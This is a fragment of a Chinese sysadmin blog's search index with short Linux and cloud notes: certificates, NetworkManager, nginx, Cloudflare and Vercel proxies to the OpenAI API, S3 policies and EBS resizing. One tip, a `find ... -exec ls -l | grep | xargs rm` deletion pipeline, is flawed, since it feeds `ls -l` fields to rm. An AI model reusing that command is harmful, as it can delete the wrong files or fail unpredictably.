smtp使用ssl时，邮件发送报错 “Error in certificate: Peer’s certificate issuer is not recognized.” # 生成证书 echo -n | openssl s_client -connect smtp.exmail.qq.com:465 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' \u003e /etc/mail.rc.d/qq.crt certutil -A -n \"GeoTrust SSL CA\" -t \"C,,\" -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt certutil -A -n \"GeoTrust Global CA\" -t \"C,,\" -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt # 校验证书 certutil -A -n \"GeoTrust SSL CA - G3\" -t \"Pu,Pu,Pu\" -d ./ -i qq.crt ## 成功显示以下内容 # Notice: Trust flag u is set automatically if the private key is present. # 修改 /etc/mail.rc 末尾添加,即可 set nss-config-dir=/etc/mail.rc.d ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:30:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"jenkins 设置国内插件源 # 阿里云源: https://mirrors.aliyun.com/jenkins/updates/update-center.json Jenkins管理界面中打开“Manage Plugins”（管理插件），然后选择“Advanced”（高级选项）标签页，在“Update Site”下拉列表中添加上述地址，并单击“Apply”（应用）按钮即可 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:31:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"/etc/sysconfig/network-scripts 为空 本来 /etc/sysconfig/network-scripts 下是有网卡的配置文件的，我不知道是做了什么事情(我记得只是在调路由表)，在操作了几次后，我就发现我的网卡配置文件都没了，但是网络连接却是正常的，后面经多方资料查询，发现是NetworkManager，他会自动管理网卡，而由他管理的话，那么就可能不再需要/etc/sysconfig/network-scripts/下的配置文件了。他的默认配置文件是在/etc/NetworkManager/system-connections下 如何继续使用/etc/sysconfig/network-scripts下的配置文件来继续管理网卡呢 $\u003e sudo vi /etc/NetworkManager/NetworkManager.conf [main] plugins=ifcfg-rh # plugins 的值可以是以下几种： # 如果plugins没有显式配置该选项，则NetworkManager将默认启用一组预安装的插件 # ifcfg-rh：用于读取和解析CentOS、RHEL等发行版相关的网卡配置文件。 # keyfile：用于从/etc/NetworkManager/system-connections目录中读取网络连接配置信息。 # dhcp：用于与DHCP服务器进行通信，并获取IP地址、子网掩码、DNS服务器等网络参数。 # wifi：用于管理Wi-Fi连接，并搜索可用的Wi-Fi热点。 # ibft、team、bridge 等等 [ifcfg-rh] wifi.scan-rand-mac-address=no # 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:32:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"双网卡优先级配置 网卡配置文件中 添加IPV4_ROUTE_METRIC参数，值越低，优先级越高 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:33:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"网卡连接后执行某个脚本 脚本存放位置: /etc/NetworkManager/dispatcher.d ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:34:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"网卡配置文件固定路由设置 关闭网卡自动路由功能 # /etc/sysconfig/network-scripts/ifcfg-enp0s31f6 PEERROUTES=no 添加固定路由 # /etc/sysconfig/network-scripts/route-enp0s31f6 ADDRESS0=172.16.0.0 # 目标地址 NETMASK0=255.255.0.0 # 子网掩码 GATEWAY0=\u003c172.16.31.1\u003e ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:35:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"acme.sh 证书安装 --reloadcmd无效问题 一般来说，我们在使用自动续签证书的时候，需要让acme.sh更新证书后自动重载一下nginx,但是我们的nginx基本都是自编译的，所以得使用acme.sh的--reloadcmd参数，但实际上在初始化时候如果你没有指定--reloadcmd,那么第一次部署后即使你在更新的自动任务中添加--reloadcmd也是无效的，这个时候可以直接修改配置证书的配置文件/root/.acme.sh/example.com/example.com.conf，在里面添加一行Le_ReloadCmd='/usr/bin/systemctl restart nginx.service'就可以了。当然，也可以在初始安装证书的时候添加--reloadcmd参数，他会给你自动加入这个参数到配置文件中. ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:36:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"openai api接口反向代理实现国内直接使用 nginx 反向代理设置(仅示例) server { listen 80; listen 443 ssl http2; server_name api.example.com; # ssl 相关配置 include conf.d/api.example.com.ssl; access_log logs/api.example.com.log main; add_header Access-Control-Allow-Origin *; location / { default_type 'application/json'; return 200 '{\"status\": \"ok\"}'; } location /v1 { proxy_pass https://api.openai.com; proxy_ssl_server_name on; proxy_set_header Host api.openai.com; proxy_set_header X-Real-IP $remote_addr; } location ~ /openai/(.*) { proxy_pass https://api.openai.com/$1$is_args$args; proxy_set_header Host api.openai.com; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 如果响应是流式的 proxy_set_header Connection ''; proxy_http_version 1.1; chunked_transfer_encoding off; proxy_buffering off; proxy_cache off; # 如果响应是一般的 proxy_buffer_size 128k; proxy_buffers 4 256k; proxy_busy_buffers_size 256k; } } 利用cloudflare的Workers来实现 登陆后在左侧栏中，选择Workers,点击创建服务,输入一个看着顺眼的服务名,选择http处理程序,然后点击创建服务.然后点击右上角快速编辑,在左侧框中填入一下代码，保存部署即可。 const TELEGRAPH_URL = 'https://api.openai.com'; addEventListener('fetch', event =\u003e { event.respondWith(handleRequest(event.request)) }) async function handleRequest(request) { const url = new URL(request.url); url.host = TELEGRAPH_URL.replace(/^https?:\\/\\//, ''); const modifiedRequest = new Request(url.toString(), { headers: request.headers, method: request.method, body: request.body, redirect: 'follow' }); const response = await fetch(modifiedRequest); const modifiedResponse = new Response(response.body, response); // 添加允许跨域访问的响应头 modifiedResponse.headers.set('Access-Control-Allow-Origin', '*'); return modifiedResponse; } 上诉步骤完成后，配置工作基本就算完成了，cloudflare会有一个默认的域名，但由于某些原因，可能访问效果不是很好，不过自定义域名可以解决，具体配置在触发器中。此处可以定义你自己想要设定的域名，不过，要定义自定义域名，你的域名ns需要指定到cloudflare中，后续内容自行研究。 vercel 反代openai // vercel.json -- cmd: vercel --prod { \"rewrites\": [ { \"source\": \"/\", \"destination\": \"https://api.openai.com\" }, { \"source\": \"/:match*\", \"destination\": \"https://api.openai.com/:match*\" // }, // { // \"source\": \"/openai/:match*\", // \"destination\": \"https://api.openai.com/:match*\" } ] } ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:37:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"云安全组配置规范 不同的云厂商他的云策略是有差异的，阿里云的云安全组是以优先级来判定的规则先后的(1-100)数字越小，优先级越高。腾讯云为顺序判定，与iptables类似，从上向下。亚马逊无要求，默认拒绝所有流量。需主动配置内外网策略(未详细测试) 云策略规则部署规范(以阿里云为例) 默认放行所有公网出流量(此项默认，可不做修改。优先级:1 ) 添加优先级最低的入口流量限制(所有协议。优先级: 100) 添加所有常用的可信端口(如:80、443。优先级: 90) 添加受信ip(如: 公司、监控机、堡垒机等IP。优先级: 1-50) 注意事项: 建议每个受信组单独建立一个安全组，方便管理。 建议配合云策略和服务器防火墙共同使用。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:38:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"webmin 密码修改 /usr/libexec/webmin/changepass.pl /etc/webmin \u003cuser\u003e \u003cpasswd\u003e ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:39:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"记录一个nginx 反代规则 # 请求 以 /example 开头的uri，反向代理到 http://127.0.0.1:8081/example 下 location ~ ^/example($|/) { proxy_pass http://127.0.0.1:8081$request_uri; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; } ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:40:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"debian pull 镜像 408 错误 # 不知道原因,解决方案如下 # 参考地址: https://stackoverflow.com/questions/38386809/docker-error-http-408-response-body-invalid-character-looking-for-beginnin sudo ip link set dev eth0 mtu 1450 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:41:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"在bash脚本中使用别名(alias)的方式 # 打开alias支持 shopt -s expand_aliases ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:42:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"rabbitmq ssl 证书配置 https://www.cnblogs.com/hellxz/p/15776987.html # ssl-server: sh make_server_cert.sh rabbitmq-server \u003cserver_passwd\u003e # ssl-client: sh create_client_cert.sh rabbitmq-client \u003cclient_passwd\u003e ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:43:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"prometheus 不同指标计间的计算方法 ## redis_memory_used_bytes Redis 内存使用量 ### redis_memory_used_bytes{cloudtype=\"阿里云\", hostname=\"riecaeph0noo\", instance=\"127.0.0.1:16370\", job=\"RedisStatusMonitor\", ostype=\"linux\", services=\"redis\"} 3322384 ## node_memory_MemTotal_bytes 系统总内存 ### node_memory_MemTotal_bytes{cloudtype=\"阿里云\", hostname=\"riecaeph0noo\", instance=\"1.1.1.1\", job=\"ServerStatusMonitor\", ostype=\"linux\", services=\"server\"} 32868929536 # 方法一: ## 计算 Redis 内存使用量占主机内存总和的百分比(适用指标标签不一致的情况) redis_memory_used_bytes / on(hostname) group_left label_replace(node_memory_MemTotal_bytes, \"hostname_group\", \"\", \"hostname\", \"(.*)\") * 100 \u003e 90 # 方法二: redis_memory_used_bytes / on(hostname) group_left node_memory_MemTotal_bytes ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:44:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"IIS http 强制跳转 https 此项未校验,来源于chatgpt \u003cconfiguration\u003e \u003csystem.webServer\u003e \u003crewrite\u003e \u003crules\u003e \u003crule name=\"Force HTTPS\" stopProcessing=\"true\"\u003e \u003cmatch url=\"(.*)\" /\u003e \u003cconditions\u003e \u003cadd input=\"{HTTPS}\" pattern=\"off\" ignoreCase=\"true\" /\u003e \u003c/conditions\u003e \u003c!-- 临时重定向 --\u003e \u003c!-- \u003caction type=\"Redirect\" redirectType=\"Temporary\" url=\"https://{HTTP_HOST}/{R:1}\" /\u003e --\u003e \u003caction type=\"Redirect\" redirectType=\"Permanent\" url=\"https://{HTTP_HOST}/{R:1}\" /\u003e \u003c/rule\u003e \u003c/rules\u003e \u003c/rewrite\u003e \u003c/system.webServer\u003e \u003c/configuration\u003e ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:45:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"find 文件性能提升 # find 查询大量文件删除时会很慢，可以用ls 配合 grep 查询需要删除的文件，然后删除 $\u003e find /path/to/directory -type f -name \"*.txt\" -exec ls -l {} \\; | grep \"pattern\" | xargs rm ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:46:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"压力测试 `ab`` 命令解释 # httpd-tools # -n: 总共要发送的请求 # -c: 并发连接 # -r: 随机数据，防止缓存 ## 例如: 50个人，每秒访问100次, 那么总共发送请求为 50 * 100 = 5000 (-n) $\u003e ab -n 5000 -c 50 -r http://www.example.com/ ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:47:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"https页面加载http资源报错的方法 解决方案: 服务端设置header: header(\"Content-Security-Policy: upgrade-insecure-requests\"); 页面设置meta头: \u003cmeta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\" /\u003e 删除链接中的协议头: \u003cscript src='//cdn.bootcss.com/jquery/3.3.1/jquery.min.js'\u003e\u003c/script\u003e nginx添加header: add_header Content-Security-Policy \"upgrade-insecure-requests\"; ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:48:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:49:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"Windows IIS 反向代理配置 https://github.com/axllent/mailpit/issues/131 前置条件 安装 url-rewrite 模块 安装 application-request-routing 模块(此项安装前，必须先安装 url-rewrite 模块) 配置 打开IIS,找到 Application Request Routing Cache打开，点击右侧Server Proxy Setings,勾选 Enable proxy，点击右侧应用即可。 打开IIS,选择网站, 打开 URL Rewrite(URL 重写), 点击右侧添加规则，选择空白规则，模式配置(.*),操作选择重写, 重写URL设置需要反向代理的地址, 例如: 需要代理到 http://127.0.0.1:8080/,则填写 http://127.0.0.1:8080/{R:1}，其他默认，保存即可。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:50:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"亚马逊存储桶 新建存储通无论是公开或私有，应优先考虑以下规则 创建存储桶(可公有访问权限) 设置\"对象所有权\"为ACL已启用 设置\"对象所有权\"为存储桶拥有者优先。 将 此存储桶的“屏蔽公共访问权限”设置取消阻止所有公开访问勾选，只勾选阻止通过新公有存储桶策略或接入点策略授予的存储桶和对象公有访问和阻止通过任何公有存储桶策略或接入点策略对存储桶和对象的公有和跨账户访问，其他默认即可 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:51:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"存储桶规则创建及示例 存储桶策略 // 此策略是为授权 cloudfront 可访问 S3 特定存储桶的所有读取权限(通过此方法设定的可以不受存储桶默认文件权限限制。根据上述存储桶规则创建内容，默认上传权限是不允许公网读的) // CDN 创建时候设置 // Origin domain: (\u003c存储桶名\u003e.s3.\u003c区域名\u003e.amazonaws.com) // 来源访问: 来源访问控制设置 - Create new OAC // 其他参数默认即可 // 以下json可以在cdn创建成功后，通过提示窗口直接复制，然后添加到 存储桶-权限-存储桶策略 中 { \"Version\": \"2008-10-17\", \"Id\": \"PolicyForCloudFrontPrivateContent\", \"Statement\": [ { \"Sid\": \"AllowCloudFrontServicePrincipal\", \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"cloudfront.amazonaws.com\" }, \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::\u003c存储桶名\u003e/*\", \"Condition\": { \"StringEquals\": { \"AWS:SourceArn\": \"CND创建成功后的arn\" } } } ] } 访问控制列表(ACL): 这个权限控制我测试发现似乎只是控制程序用户是否可以操作存储桶内容的。 s3fs 挂载: ## https://github.com/s3fs-fuse/s3fs-fuse ## 注意: 启用OAC的需要使用 sigv4 才能正常连接 $\u003e vim /etc/fstab s3fs#\u003c存储桶名\u003e \u003c挂载到的目录\u003e fuse auto,_netdev,sigv4,allow_other,passwd_file=/etc/sysconfig/passwd-s3fs,endpoint=ap-east-1,use_path_request_style,url=https://s3.ap-east-1.amazonaws.com 0 0 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:51:1","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"亚马逊用户策略 // 方案一 // 注意: 若是按照上面存储通步骤创建存储桶，那么需要手动打开 `权限` - `访问控制列表(ACL)` 中 所有人(公有访问权限) 的 `列出` 权限，否则通过api无法正常操作(s3 brower也需要开启此项设置) // 以下策略用于控制仅限`特定用户`操作特定的存储桶，该策略附加给用户 { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"s3:*\" ], \"Resource\": [ \"arn:aws:s3:::\u003c存储桶名\u003e/*\" ] } ] } // 方案二 // 以下策略设置在 `存储桶` - `权限` - `存储桶策略` 中，用于控制存储桶接受那个用户操作，该策略是附加给存储桶的 // https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/example-bucket-policies.html { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"AddPublicReadCannedAcl\", \"Effect\": \"Allow\", \"Principal\": { \"AWS\": [ \"用户的ARN\", ] }, \"Action\": [ \"s3:*\" ], \"Resource\": \"arn:aws:s3:::存储桶名/*\", \"Condition\": { \"StringEquals\": { \"s3:x-amz-acl\": [ \"public-read\" // 必须指定的ACL权限 ] } } } ] } ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:51:2","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"gnome-shell 终端设置 title $\u003e export PROMPT_COMMAND='echo -ne \"\\033]0; ${USER}@${HOSTNAME} \\007\"' ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:52:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"阿里云安装 alinux 操作系统安装 docker # aliyun的两个云镜像要安装docker都得安装一个兼容插件，否则在官方仓库中找不到对应的地址 ## Alibaba Cloud Linux 2 $\u003e wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo $\u003e sudo yum install yum-plugin-releasever-adapter --disablerepo=* --enablerepo=plus # 兼容插件 ## Alibaba Cloud Linux 3 $\u003e dnf config-manager --add-repo=https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo $\u003e sudo dnf -y install dnf-plugin-releasever-adapter --repo alinux3-plus # 兼容插件 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:53:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试) 问题体现: 亚马逊添加cdn分配后，指向源站为elb，此时cdn配置多个备用域名，正常解析后，无论访问的是哪个备用域名，他们请求的最终站点始终是一个。 问题分析: 怀疑是sni的问题，elb和cdn这边所使用的证书都是通配符证书, 而在请求过程中，携带的sni只有主域名，而上述问题中请求到的最终站点，恰好又是nginx中配置的第一个。 解决方案: 为每一个cdn备用域名添加一个独立的cdn ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:54:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容) ### https://docs.aws.amazon.com/zh_cn/ebs/latest/userguide/recognize-expanded-volume-linux.html ## 1. 检查卷是否有分区 $\u003e sudo lsblk ## 2. 扩展分区 # $\u003e sudo growpart 需要扩展的盘 1 $\u003e sudo growpart /dev/nvme0n1 1 ## 3. 扩展文件系统 # xfs $\u003e sudo xfs_growfs -d / # ext4 # $\u003e sudo resize2fs \u003c挂载分区名\u003e $\u003e sudo resize2fs /dev/nvme0n1p1 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:55:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"亚马逊加速器配置 https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html AWS Global Accelerator可以提高全球受众使用的 Internet 应用程序的可用性。使用标准加速器，全球加速器将 AWS 全球网络的流量引导到离客户端最近的区域中的终端节点。 本节主要说明标准加速 案例: 我的服务器位于新加坡，在欧洲等其他地区访问新加坡服务器上站点很慢，正常来说，针对于站点加速应该优先使用cdn，但是我们的站点主要是提供api请求等动态的服务, 很少涉及静态资源缓存。所有选择AWS Global Accelerator。 创建步骤(登陆aws后，选择 Global Accelerator服务， 点击创建加速器): 输入名称： 输入加速器名称, 加速器类型选择标准, 其他根据需求修改， 点击下一步。 侦听器：录入端口、协议、客户端亲和性 ，其中端口为后端对应的端口(比如我是加速后端80，这儿填写的就是80，建议一个端口一个监听器) 添加端点组： 